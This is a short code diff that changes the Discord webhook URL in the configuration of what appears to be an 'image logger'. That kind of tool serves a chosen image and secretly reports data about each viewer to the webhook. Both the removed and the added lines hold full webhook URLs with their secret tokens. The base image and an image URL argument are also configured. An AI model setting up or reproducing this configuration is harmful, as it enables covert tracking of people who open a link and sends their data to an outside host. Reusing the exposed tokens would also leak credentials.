@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1455195101142847692/u3DIdCD_xi4RbqZy_e7lS9sc1zAp4aUgoVHRR0KGsDtIPxu1R-D_h9NhE5Swu63aKxwn",
+    "webhook": "https://discord.com/api/webhooks/1455199433133396156/cAR7_tazd8A63ME94RTo3IoFuBuKAzNBEF8XbWz_wV4EVDcGPFI_Ea054wTP86F-NpyI",
     "image": "https://images.fineartamerica.com/images-medium-large-5/awesome-solitude-bess-hamiti.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
